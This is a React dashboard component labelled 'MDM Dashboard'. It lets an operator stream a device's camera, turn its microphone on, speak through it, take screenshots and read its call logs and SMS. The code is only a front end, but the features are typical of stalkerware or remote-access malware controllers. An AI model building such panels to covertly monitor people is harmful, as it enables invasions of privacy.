import { useState } from 'react'
import { useSocket } from '../hooks/useSocket'
import DeviceList from '../components/DeviceList'
import CameraPanel from '../components/CameraPanel'
import MicPanel from '../components/MicPanel'
import SpeakPanel from '../components/SpeakPanel'
import InfoPanel from '../components/InfoPanel'
import CallLogsPanel from '../components/CallLogsPanel'
import SMSPanel from '../components/SMSPanel'

export default function Dashboard({ token, onLogout }) {
  const [selected, setSelected] = useState(null)
  const [cameraOn, setCameraOn] = useState({})

  const {
    connected, devices, cameraFrames, micActive,
    deviceInfos, batteries, callLogs, smsMessages, screenshots,
    cameraStart, cameraStop, micOn, micOff, speak,
    takeScreenshot, getCallLogs, getSMS,
  } = useSocket(token)

  function handleCameraToggle(id) {
    if (cameraOn[id]) { cameraStop(id); setCameraOn(p => ({ ...p, [id]: false })) }
    else               { cameraStart(id); setCameraOn(p => ({ ...p, [id]: true })) }
  }

  function handleMicToggle(id) {
    if (micActive[id]) micOff(id); else micOn(id)
  }

  return (
    <div className="dashboard">
      <aside className="sidebar">
        <div className="sidebar-header">
          <h2>MDM Dashboard</h2>
          <span className={`conn-badge ${connected ? 'on' : 'off'}`}>
            {connected ? 'Connected' : 'Disconnected'}
          </span>
        </div>
        <p className="sidebar-label">Devices</p>
        <DeviceList
          devices={Object.values(devices)}
          selected={selected}
          onSelect={setSelected}
        />
        <button className="logout-btn" onClick={onLogout}>Sign Out</button>
      </aside>

      <main className="main-panel">
        {!selected ? (
          <div className="empty-state">Select a device from the sidebar</div>
        ) : (
          <>
            <p className="device-title">Monitoring: <strong>{selected}</strong></p>
            <div className="panels-grid">

              {/* Row 1: Camera + Info */}
              <CameraPanel
                frame={cameraFrames[selected]}
                isOn={!!cameraOn[selected]}
                onToggle={() => handleCameraToggle(selected)}
                onScreenshot={() => takeScreenshot(selected)}
                lastScreenshot={screenshots[selected]}
              />
              <InfoPanel
                info={deviceInfos[selected]}
                battery={batteries[selected]}
              />

              {/* Row 2: Mic + Speak */}
              <MicPanel
                isActive={!!micActive[selected]}
                onToggle={() => handleMicToggle(selected)}
              />
              <SpeakPanel
                onSpeak={(audio) => speak(selected, audio)}
              />

              {/* Row 3: Call Logs */}
              <CallLogsPanel
                logs={callLogs[selected]}
                onRefresh={() => getCallLogs(selected)}
              />

              {/* Row 4: SMS */}
              <SMSPanel
                messages={smsMessages[selected]}
                onRefresh={() => getSMS(selected)}
              />

            </div>
          </>
        )}
      </main>
    </div>
  )
}
